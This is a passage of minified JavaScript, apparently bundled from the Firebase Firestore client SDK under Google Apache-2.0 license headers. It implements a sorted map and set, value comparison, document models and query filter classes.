 */class Qt{constructor(e,t){this.comparator=e,this.root=t||Dn.EMPTY}insert(e,t){return new Qt(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,Dn.BLACK,null,null))}remove(e){return new Qt(this.comparator,this.root.remove(e,this.comparator).copy(null,null,Dn.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){const r=this.comparator(e,t.key);if(r===0)return t.value;r<0?t=t.left:r>0&&(t=t.right)}return null}indexOf(e){let t=0,r=this.root;for(;!r.isEmpty();){const i=this.comparator(e,r.key);if(i===0)return t+r.left.size;i<0?r=r.left:(t+=r.left.size+1,r=r.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal((t,r)=>(e(t,r),!1))}toString(){const e=[];return this.inorderTraversal((t,r)=>(e.push(`${t}:${r}`),!1)),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new lf(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new lf(this.root,e,this.comparator,!1)}getReverseIterator(){return new lf(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new lf(this.root,e,this.comparator,!0)}}class lf{constructor(e,t,r,i){this.isReverse=i,this.nodeStack=[];let s=1;for(;!e.isEmpty();)if(s=t?r(e.key,t):1,t&&i&&(s*=-1),s<0)e=this.isReverse?e.left:e.right;else{if(s===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class Dn{constructor(e,t,r,i,s){this.key=e,this.value=t,this.color=r??Dn.RED,this.left=i??Dn.EMPTY,this.right=s??Dn.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,r,i,s){return new Dn(e??this.key,t??this.value,r??this.color,i??this.left,s??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,r){let i=this;const s=r(e,i.key);return i=s<0?i.copy(null,null,null,i.left.insert(e,t,r),null):s===0?i.copy(null,t,null,null,null):i.copy(null,null,null,null,i.right.insert(e,t,r)),i.fixUp()}removeMin(){if(this.left.isEmpty())return Dn.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let r,i=this;if(t(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,t),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),t(e,i.key)===0){if(i.right.isEmpty())return Dn.EMPTY;r=i.right.min(),i=i.copy(r.key,r.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,t))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,Dn.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,Dn.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw Me();const e=this.left.check();if(e!==this.right.check())throw Me();return e+(this.isRed()?0:1)}}Dn.EMPTY=null,Dn.RED=!0,Dn.BLACK=!1;Dn.EMPTY=new class{constructor(){this.size=0}get key(){throw Me()}get value(){throw Me()}get color(){throw Me()}get left(){throw Me()}get right(){throw Me()}copy(e,t,r,i,s){return this}insert(e,t,r){return new Dn(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yn{constructor(e){this.comparator=e,this.data=new Qt(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal((t,r)=>(e(t),!1))}forEachInRange(e,t){const r=this.data.getIteratorFrom(e[0]);for(;r.hasNext();){const i=r.getNext();if(this.comparator(i.key,e[1])>=0)return;t(i.key)}}forEachWhile(e,t){let r;for(r=t!==void 0?this.data.getIteratorFrom(t):this.data.getIterator();r.hasNext();)if(!e(r.getNext().key))return}firstAfterOrEqual(e){const t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new MI(this.data.getIterator())}getIteratorFrom(e){return new MI(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach(r=>{t=t.add(r)}),t}isEqual(e){if(!(e instanceof yn)||this.size!==e.size)return!1;const t=this.data.getIterator(),r=e.data.getIterator();for(;t.hasNext();){const i=t.getNext().key,s=r.getNext().key;if(this.comparator(i,s)!==0)return!1}return!0}toArray(){const e=[];return this.forEach(t=>{e.push(t)}),e}toString(){const e=[];return this.forEach(t=>e.push(t)),"SortedSet("+e.toString()+")"}copy(e){const t=new yn(this.comparator);return t.data=e,t}}class MI{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Cr{constructor(e){this.fields=e,e.sort(Bn.comparator)}static empty(){return new Cr([])}unionWith(e){let t=new yn(Bn.comparator);for(const r of this.fields)t=t.add(r);for(const r of e)t=t.add(r);return new Cr(t.toArray())}covers(e){for(const t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return Ul(this.fields,e.fields,(t,r)=>t.isEqual(r))}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Q2 extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vn{constructor(e){this.binaryString=e}static fromBase64String(e){const t=function(i){try{return atob(i)}catch(s){throw typeof DOMException<"u"&&s instanceof DOMException?new Q2("Invalid base64 string: "+s):s}}(e);return new Vn(t)}static fromUint8Array(e){const t=function(i){let s="";for(let o=0;o<i.length;++o)s+=String.fromCharCode(i[o]);return s}(e);return new Vn(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return function(t){return btoa(t)}(this.binaryString)}toUint8Array(){return function(t){const r=new Uint8Array(t.length);for(let i=0;i<t.length;i++)r[i]=t.charCodeAt(i);return r}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return $e(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Vn.EMPTY_BYTE_STRING=new Vn("");const vV=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function co(n){if(st(!!n),typeof n=="string"){let e=0;const t=vV.exec(n);if(st(!!t),t[1]){let i=t[1];i=(i+"000000000").substr(0,9),e=Number(i)}const r=new Date(n);return{seconds:Math.floor(r.getTime()/1e3),nanos:e}}return{seconds:nn(n.seconds),nanos:nn(n.nanos)}}function nn(n){return typeof n=="number"?n:typeof n=="string"?Number(n):0}function uo(n){return typeof n=="string"?Vn.fromBase64String(n):Vn.fromUint8Array(n)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Y2="server_timestamp",Z2="__type__",J2="__previous_value__",X2="__local_write_time__";function Sv(n){var e,t;return((t=(((e=n==null?void 0:n.mapValue)===null||e===void 0?void 0:e.fields)||{})[Z2])===null||t===void 0?void 0:t.stringValue)===Y2}function Wp(n){const e=n.mapValue.fields[J2];return Sv(e)?Wp(e):e}function Wu(n){const e=co(n.mapValue.fields[X2].timestampValue);return new mn(e.seconds,e.nanos)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _V{constructor(e,t,r,i,s,o,a,l,u){this.databaseId=e,this.appId=t,this.persistenceKey=r,this.host=i,this.ssl=s,this.forceLongPolling=o,this.autoDetectLongPolling=a,this.longPollingOptions=l,this.useFetchStreams=u}}const Dd="(default)";class $u{constructor(e,t){this.projectId=e,this.database=t||Dd}static empty(){return new $u("","")}get isDefaultDatabase(){return this.database===Dd}isEqual(e){return e instanceof $u&&e.projectId===this.projectId&&e.database===this.database}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ek="__type__",tk="__max__",cf={mapValue:{fields:{__type__:{stringValue:tk}}}},nk="__vector__",Od="value";function ho(n){return"nullValue"in n?0:"booleanValue"in n?1:"integerValue"in n||"doubleValue"in n?2:"timestampValue"in n?3:"stringValue"in n?5:"bytesValue"in n?6:"referenceValue"in n?7:"geoPointValue"in n?8:"arrayValue"in n?9:"mapValue"in n?Sv(n)?4:IV(n)?9007199254740991:EV(n)?10:11:Me()}function Ci(n,e){if(n===e)return!0;const t=ho(n);if(t!==ho(e))return!1;switch(t){case 0:case 9007199254740991:return!0;case 1:return n.booleanValue===e.booleanValue;case 4:return Wu(n).isEqual(Wu(e));case 3:return function(i,s){if(typeof i.timestampValue=="string"&&typeof s.timestampValue=="string"&&i.timestampValue.length===s.timestampValue.length)return i.timestampValue===s.timestampValue;const o=co(i.timestampValue),a=co(s.timestampValue);return o.seconds===a.seconds&&o.nanos===a.nanos}(n,e);case 5:return n.stringValue===e.stringValue;case 6:return function(i,s){return uo(i.bytesValue).isEqual(uo(s.bytesValue))}(n,e);case 7:return n.referenceValue===e.referenceValue;case 8:return function(i,s){return nn(i.geoPointValue.latitude)===nn(s.geoPointValue.latitude)&&nn(i.geoPointValue.longitude)===nn(s.geoPointValue.longitude)}(n,e);case 2:return function(i,s){if("integerValue"in i&&"integerValue"in s)return nn(i.integerValue)===nn(s.integerValue);if("doubleValue"in i&&"doubleValue"in s){const o=nn(i.doubleValue),a=nn(s.doubleValue);return o===a?Ld(o)===Ld(a):isNaN(o)&&isNaN(a)}return!1}(n,e);case 9:return Ul(n.arrayValue.values||[],e.arrayValue.values||[],Ci);case 10:case 11:return function(i,s){const o=i.mapValue.fields||{},a=s.mapValue.fields||{};if(RI(o)!==RI(a))return!1;for(const l in o)if(o.hasOwnProperty(l)&&(a[l]===void 0||!Ci(o[l],a[l])))return!1;return!0}(n,e);default:return Me()}}function Hu(n,e){return(n.values||[]).find(t=>Ci(t,e))!==void 0}function jl(n,e){if(n===e)return 0;const t=ho(n),r=ho(e);if(t!==r)return $e(t,r);switch(t){case 0:case 9007199254740991:return 0;case 1:return $e(n.booleanValue,e.booleanValue);case 2:return function(s,o){const a=nn(s.integerValue||s.doubleValue),l=nn(o.integerValue||o.doubleValue);return a<l?-1:a>l?1:a===l?0:isNaN(a)?isNaN(l)?0:-1:1}(n,e);case 3:return NI(n.timestampValue,e.timestampValue);case 4:return NI(Wu(n),Wu(e));case 5:return dy(n.stringValue,e.stringValue);case 6:return function(s,o){const a=uo(s),l=uo(o);return a.compareTo(l)}(n.bytesValue,e.bytesValue);case 7:return function(s,o){const a=s.split("/"),l=o.split("/");for(let u=0;u<a.length&&u<l.length;u++){const h=$e(a[u],l[u]);if(h!==0)return h}return $e(a.length,l.length)}(n.referenceValue,e.referenceValue);case 8:return function(s,o){const a=$e(nn(s.latitude),nn(o.latitude));return a!==0?a:$e(nn(s.longitude),nn(o.longitude))}(n.geoPointValue,e.geoPointValue);case 9:return PI(n.arrayValue,e.arrayValue);case 10:return function(s,o){var a,l,u,h;const f=s.fields||{},m=o.fields||{},v=(a=f[Od])===null||a===void 0?void 0:a.arrayValue,x=(l=m[Od])===null||l===void 0?void 0:l.arrayValue,k=$e(((u=v==null?void 0:v.values)===null||u===void 0?void 0:u.length)||0,((h=x==null?void 0:x.values)===null||h===void 0?void 0:h.length)||0);return k!==0?k:PI(v,x)}(n.mapValue,e.mapValue);case 11:return function(s,o){if(s===cf.mapValue&&o===cf.mapValue)return 0;if(s===cf.mapValue)return 1;if(o===cf.mapValue)return-1;const a=s.fields||{},l=Object.keys(a),u=o.fields||{},h=Object.keys(u);l.sort(),h.sort();for(let f=0;f<l.length&&f<h.length;++f){const m=dy(l[f],h[f]);if(m!==0)return m;const v=jl(a[l[f]],u[h[f]]);if(v!==0)return v}return $e(l.length,h.length)}(n.mapValue,e.mapValue);default:throw Me()}}function NI(n,e){if(typeof n=="string"&&typeof e=="string"&&n.length===e.length)return $e(n,e);const t=co(n),r=co(e),i=$e(t.seconds,r.seconds);return i!==0?i:$e(t.nanos,r.nanos)}function PI(n,e){const t=n.values||[],r=e.values||[];for(let i=0;i<t.length&&i<r.length;++i){const s=jl(t[i],r[i]);if(s)return s}return $e(t.length,r.length)}function Vl(n){return py(n)}function py(n){return"nullValue"in n?"null":"booleanValue"in n?""+n.booleanValue:"integerValue"in n?""+n.integerValue:"doubleValue"in n?""+n.doubleValue:"timestampValue"in n?function(t){const r=co(t);return`time(${r.seconds},${r.nanos})`}(n.timestampValue):"stringValue"in n?n.stringValue:"bytesValue"in n?function(t){return uo(t).toBase64()}(n.bytesValue):"referenceValue"in n?function(t){return Se.fromName(t).toString()}(n.referenceValue):"geoPointValue"in n?function(t){return`geo(${t.latitude},${t.longitude})`}(n.geoPointValue):"arrayValue"in n?function(t){let r="[",i=!0;for(const s of t.values||[])i?i=!1:r+=",",r+=py(s);return r+"]"}(n.arrayValue):"mapValue"in n?function(t){const r=Object.keys(t.fields||{}).sort();let i="{",s=!0;for(const o of r)s?s=!1:i+=",",i+=`${o}:${py(t.fields[o])}`;return i+"}"}(n.mapValue):Me()}function Df(n){switch(ho(n)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=Wp(n);return e?16+Df(e):16;case 5:return 2*n.stringValue.length;case 6:return uo(n.bytesValue).approximateByteSize();case 7:return n.referenceValue.length;case 9:return function(r){return(r.values||[]).reduce((i,s)=>i+Df(s),0)}(n.arrayValue);case 10:case 11:return function(r){let i=0;return _o(r.fields,(s,o)=>{i+=s.length+Df(o)}),i}(n.mapValue);default:throw Me()}}function LI(n,e){return{referenceValue:`projects/${n.projectId}/databases/${n.database}/documents/${e.path.canonicalString()}`}}function gy(n){return!!n&&"integerValue"in n}function Tv(n){return!!n&&"arrayValue"in n}function DI(n){return!!n&&"nullValue"in n}function OI(n){return!!n&&"doubleValue"in n&&isNaN(Number(n.doubleValue))}function Of(n){return!!n&&"mapValue"in n}function EV(n){var e,t;return((t=(((e=n==null?void 0:n.mapValue)===null||e===void 0?void 0:e.fields)||{})[ek])===null||t===void 0?void 0:t.stringValue)===nk}function ou(n){if(n.geoPointValue)return{geoPointValue:Object.assign({},n.geoPointValue)};if(n.timestampValue&&typeof n.timestampValue=="object")return{timestampValue:Object.assign({},n.timestampValue)};if(n.mapValue){const e={mapValue:{fields:{}}};return _o(n.mapValue.fields,(t,r)=>e.mapValue.fields[t]=ou(r)),e}if(n.arrayValue){const e={arrayValue:{values:[]}};for(let t=0;t<(n.arrayValue.values||[]).length;++t)e.arrayValue.values[t]=ou(n.arrayValue.values[t]);return e}return Object.assign({},n)}function IV(n){return(((n.mapValue||{}).fields||{}).__type__||{}).stringValue===tk}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gr{constructor(e){this.value=e}static empty(){return new gr({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let r=0;r<e.length-1;++r)if(t=(t.mapValue.fields||{})[e.get(r)],!Of(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=ou(t)}setAll(e){let t=Bn.emptyPath(),r={},i=[];e.forEach((o,a)=>{if(!t.isImmediateParentOf(a)){const l=this.getFieldsMap(t);this.applyChanges(l,r,i),r={},i=[],t=a.popLast()}o?r[a.lastSegment()]=ou(o):i.push(a.lastSegment())});const s=this.getFieldsMap(t);this.applyChanges(s,r,i)}delete(e){const t=this.field(e.popLast());Of(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return Ci(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let r=0;r<e.length;++r){let i=t.mapValue.fields[e.get(r)];Of(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},t.mapValue.fields[e.get(r)]=i),t=i}return t.mapValue.fields}applyChanges(e,t,r){_o(t,(i,s)=>e[i]=s);for(const i of r)delete e[i]}clone(){return new gr(ou(this.value))}}function rk(n){const e=[];return _o(n.fields,(t,r)=>{const i=new Bn([t]);if(Of(r)){const s=rk(r.mapValue).fields;if(s.length===0)e.push(i);else for(const o of s)e.push(i.child(o))}else e.push(i)}),new Cr(e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xn{constructor(e,t,r,i,s,o,a){this.key=e,this.documentType=t,this.version=r,this.readTime=i,this.createTime=s,this.data=o,this.documentState=a}static newInvalidDocument(e){return new Xn(e,0,De.min(),De.min(),De.min(),gr.empty(),0)}static newFoundDocument(e,t,r,i){return new Xn(e,1,t,De.min(),r,i,0)}static newNoDocument(e,t){return new Xn(e,2,t,De.min(),De.min(),gr.empty(),0)}static newUnknownDocument(e,t){return new Xn(e,3,t,De.min(),De.min(),gr.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(De.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=gr.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=gr.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=De.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Xn&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Xn(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bd{constructor(e,t){this.position=e,this.inclusive=t}}function BI(n,e,t){let r=0;for(let i=0;i<n.position.length;i++){const s=e[i],o=n.position[i];if(s.field.isKeyField()?r=Se.comparator(Se.fromName(o.referenceValue),t.key):r=jl(o,t.data.field(s.field)),s.dir==="desc"&&(r*=-1),r!==0)break}return r}function UI(n,e){if(n===null)return e===null;if(e===null||n.inclusive!==e.inclusive||n.position.length!==e.position.length)return!1;for(let t=0;t<n.position.length;t++)if(!Ci(n.position[t],e.position[t]))return!1;return!0}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ud{constructor(e,t="asc"){this.field=e,this.dir=t}}function SV(n,e){return n.dir===e.dir&&n.field.isEqual(e.field)}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ik{}class fn extends ik{constructor(e,t,r){super(),this.field=e,this.op=t,this.value=r}static create(e,t,r){return e.isKeyField()?t==="in"||t==="not-in"?this.createKeyFieldInFilter(e,t,r):new AV(e,t,r):t==="array-contains"?new kV(e,r):t==="in"?new CV(e,r):t==="not-in"?new RV(e,r):t==="array-contains-any"?new MV(e,r):new fn(e,t,r)}static createKeyFieldInFilter(e,t,r){return t==="in"?new bV(e,r):new xV(e,r)}matches(e){const t=e.data.field(this.field);return this.op==="!="?t!==null&&this.matchesComparison(jl(t,this.value)):t!==null&&ho(this.value)===ho(t)&&this.matchesComparison(jl(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return Me()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class gi extends ik{constructor(e,t){super(),this.filters=e,this.op=t,this.ce=null}static create(e,t){return new gi(e,t)}matches(e){return sk(this)?this.filters.find(t=>!t.matches(e))===void 0:this.filters.find(t=>t.matches(e))!==void 0}getFlattenedFilters(){return this.ce!==null||(this.ce=this.filters.reduce((e,t)=>e.concat(t.getFlattenedFilters()),[])),this.ce}getFilters(){return Object.assign([],this.filters)}}function sk(n){return n.op==="and"}function ok(n){return TV(n)&&sk(n)}function TV(n){for(const e of n.filters)if(e instanceof gi)return!1;return!0}function my(n){if(n instanceof fn)return n.field.canonicalString()+n.op.toString()+Vl(n.value);if(ok(n))return n.filters.map(e=>my(e)).join(",");{const e=n.filters.map(t=>my(t)).join(",");return`${n.op}(${e})`}}function ak(n,e){return n instanceof fn?function(r,i){return i instanceof fn&&r.op===i.op&&r.field.isEqual(i.field)&&Ci(r.value,i.value)}(n,e):n instanceof gi?function(r,i){return i instanceof gi&&r.op===i.op&&r.filters.length===i.filters.length?r.filters.reduce((s,o,a)=>s&&ak(o,i.filters[a]),!0):!1}(n,e):void Me()}function lk(n){return n instanceof fn?function(t){return`${t.field.canonicalString()} ${t.op} ${Vl(t.value)}`}(n):n instanceof gi?function(t){return t.op.toString()+" {"+t.getFilters().map(lk).join(" ,")+"}"}(n):"Filter"}class AV extends fn{constructor(e,t,r){super(e,t,r),this.key=Se.fromName(r.referenceValue)}matches(e){const t=Se.comparator(e.key,this.key);return this.matchesComparison(t)}}class bV extends fn{constructor(e,t){super(e,"in",t),this.keys=ck("in",t)}matches(e){return this.keys.some(t=>t.isEqual(e.key))}}class xV extends fn{constructor(e,t){super(e,"not-in",t),this.keys=ck("not-in",t)}matches(e){return!this.keys.some(t=>t.isEqual(e.key))}}function ck(n,e){var t;return(((t=e.arrayValue)===null||t===void 0?void 0:t.values)||[]).map(r=>Se.fromName(r.referenceValue))}class kV extends fn{constructor(e,t){super(e,"array-contains",t)}matches(e){const t=e.data.field(this.field);return Tv(t)&&Hu(t.arrayValue,this.value)}}class CV extends fn{constructor(e,t){super(e,"in",t)}matches(e){const t=e.data.field(this.field);return t!==null&&Hu(this.value.arrayValue,t)}}class RV extends fn{constructor(e,t){super(e,"not-in",t)}matches(e){if(Hu(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const t=e.data.field(this.field);return t!==null&&!Hu(this.value.arrayValue,t)}}class MV extends fn{constructor(e,t){super(e,"array-contains-any",t)}matches(e){const t=e.data.field(this.field);return!(!Tv(t)||!t.arrayValue.values)&&t.arrayValue.values.some(r=>Hu(this.value.arrayValue,r))}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
